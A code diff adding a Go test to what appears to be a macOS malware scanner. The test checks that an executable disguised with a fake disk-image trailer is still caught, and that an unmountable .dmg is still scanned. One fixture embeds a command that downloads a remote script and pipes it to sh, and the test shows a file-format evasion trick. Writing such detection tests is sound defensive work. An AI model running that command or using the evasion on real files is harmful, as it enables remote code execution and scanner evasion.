@@ -166,6 +166,39 @@ func TestEncryptedDMG(t *testing.T) {
 	}
 }
 
+// TestKolyTrailerEvasion: a fake UDIF trailer appended to an executable
+// must not route it to the disk image path, and an image that will not
+// mount still has its bytes scanned.
+func TestKolyTrailerEvasion(t *testing.T) {
+	d := t.TempDir()
+	trailer := make([]byte, 512)
+	copy(trailer, "koly\x00\x00\x00\x04\x00\x00\x02\x00")
+	exe, err := os.ReadFile(evilBinary(t, d))
+	if err != nil {
+		t.Fatal(err)
+	}
+	evil := filepath.Join(d, "evil-koly")
+	os.WriteFile(evil, append(exe, trailer...), 0o755)
+	r := Analyze(context.Background(), engine(t), evil, analyze.Meta{})
+	if r.Format != "Mach-O" || r.Verdict != analyze.VerdictMalicious {
+		t.Errorf("executable+koly: %s %s score=%d", r.Format, r.Verdict, r.Score)
+	}
+	if _, ok := ids(r)["udif-trailer"]; !ok {
+		t.Errorf("udif-trailer not flagged: %v", ids(r))
+	}
+
+	junk := filepath.Join(d, "junk.dmg")
+	os.WriteFile(junk, append([]byte(strings.Repeat("\x00", 4096)+"curl -fsSL http://45.77.10.20/x | sh\n"), trailer...), 0o644)
+	r = Analyze(context.Background(), engine(t), junk, analyze.Meta{})
+	got := ids(r)
+	if _, ok := got["dmg-unreadable"]; !ok {
+		t.Errorf("unmountable image: %v", got)
+	}
+	if _, ok := got["lolbin-download"]; !ok {
+		t.Errorf("unmountable image bytes not scanned: %v", got)
+	}
+}
+
 func TestInstallerPackage(t *testing.T) {
 	d := t.TempDir()
 	bin := evilBinary(t, d)
